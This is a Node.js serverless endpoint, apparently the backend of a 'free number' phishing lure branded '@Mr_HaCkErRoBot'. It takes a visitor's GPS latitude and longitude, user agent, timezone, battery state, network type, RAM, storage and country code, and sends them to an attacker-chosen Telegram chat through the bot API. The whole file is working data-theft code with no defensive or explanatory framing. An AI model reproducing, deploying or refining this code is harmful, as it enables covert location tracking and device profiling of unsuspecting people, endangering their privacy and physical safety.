const fetch = require('node-fetch');
const FormData = require('formidable');

module.exports = async (req, res) => {
  const botToken = process.env.TOKEN;
  const allowedOrigin = 'https://free-number1.vercel.app'; // <- دامنه‌ی خودت

  if (req.headers.origin && req.headers.origin !== allowedOrigin) {
    return res.status(403).json({ ok: false, error: 'Invalid origin' });
  }

  if (req.method !== 'POST') {
    return res.status(405).json({ ok: false, error: 'Method not allowed' });
  }

  const form = new FormData.IncomingForm();

  const sanitizeInput = (input) => {
    if (!input) return 'Unknown';
    const sanitized = String(input)
      .replace(/[<>]/g, '')
      .replace(/[*_[]()#`]/g, '') 
      .replace(/(\r\n|\n|\r|\t)/g, '') 
      .replace(/[^\x20-\x7E]/g, ''); 
    return sanitized.length > 500 ? sanitized.substring(0, 500) : sanitized;
  };

  const isValidNumber = (value, min, max) => {
    const num = parseFloat(value);
    return !isNaN(num) && num >= min && num <= max;
  };

  form.parse(req, async (err, fields, files) => {
    if (err) {
      return res.status(500).json({ ok: false, error: 'Internal server error' });
    }

    const allowedFields = [
      'chat_id', 'latitude', 'longitude', 'user_agent', 'timezone',
      'battery_level', 'battery_charging', 'network_type', 'network_speed',
      'ram', 'storage', 'country_code'
    ];

    for (const field in fields) {
      if (!allowedFields.includes(field)) {
        return res.status(400).json({ ok: false, error: 'Invalid input field' });
      }
    }

    const {
      chat_id: chatId,
      latitude,
      longitude,
      user_agent: rawUserAgent,
      timezone: rawTimezone,
      battery_level: rawBatteryLevel,
      battery_charging: batteryCharging,
      network_type: rawNetworkType,
      network_speed: rawNetworkSpeed,
      ram: rawRam,
      storage: rawStorage,
      country_code: rawCountryCode
    } = fields;

    if (!chatId || !latitude || !longitude) {
      return res.status(400).json({ ok: false, error: 'Missing required parameters' });
    }

    if (isNaN(chatId)) {
      return res.status(400).json({ ok: false, error: 'Invalid chat_id' });
    }

    if (!isValidNumber(latitude, -90, 90) || !isValidNumber(longitude, -180, 180)) {
      return res.status(400).json({ ok: false, error: 'Invalid latitude or longitude' });
    }

    const batteryLevel = rawBatteryLevel && isValidNumber(rawBatteryLevel, 0, 100) ? rawBatteryLevel : 'Unknown';

    const userAgent = sanitizeInput(rawUserAgent);
    const timezone = sanitizeInput(rawTimezone);
    const networkType = sanitizeInput(rawNetworkType);
    const networkSpeed = sanitizeInput(rawNetworkSpeed);
    const ram = sanitizeInput(rawRam);
    const storage = sanitizeInput(rawStorage);
    const countryCode = sanitizeInput(rawCountryCode);

    const isCharging = batteryCharging === 'true' ? 'Charging' : 'Not Charging';

    try {
      const now = new Date();
      const dateTime = now.toLocaleString();

      const messageText = `*╭┈┈┈┈┈┈┈┈┈┈┈┈┈╮\n⚡Powered by :- @Mr_HaCkErRoBot\n╰┈┈┈┈┈┈┈┈┈┈┈┈┈╯*\n\n` +
        `*📌 New Data Received:*\n\n` +
        `*📍 Latitude:* ${latitude}\n` +
        `*📍 Longitude:* ${longitude}\n` +
        `*📱 User Agent:* ${userAgent || 'Unknown'}\n` +
        `*📅 Date:* ${dateTime}\n` +
        `*🌍 Timezone:* ${timezone || 'Unknown'}\n` +
        `*🔋 Battery:* ${batteryLevel}% (${isCharging})\n` +
        `*📶 Network:* ${networkType || 'Unknown'} (${networkSpeed || 'Unknown'} Mbps)\n` +
        `*📞 Selected Number:* User Denied\n` +
        `*🌐 Country Code:* ${countryCode || 'Unknown'}\n` +
        `*💾 RAM:* ${ram || 'Unknown'} GB\n` +
        `*💽 Storage:* ${storage || 'Unknown'}\n` +
        `*🔒 Permission:* Denied`;

      const locationRes = await fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ chat_id: chatId, latitude, longitude })
      });

      const locResult = await locationRes.json();
      if (!locResult.ok) {
        return res.status(500).json({ ok: false, error: 'Internal server error' });
      }

      const messageRes = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ chat_id: chatId, text: messageText, parse_mode: 'Markdown' })
      });

      const msgResult = await messageRes.json();
      if (!msgResult.ok) {
        return res.status(500).json({ ok: false, error: 'Internal server error' });
      }

      return res.status(200).json({ ok: true });
    } catch (error) {
      return res.status(500).json({ ok: false, error: 'Internal server error' });
    }
  });
};
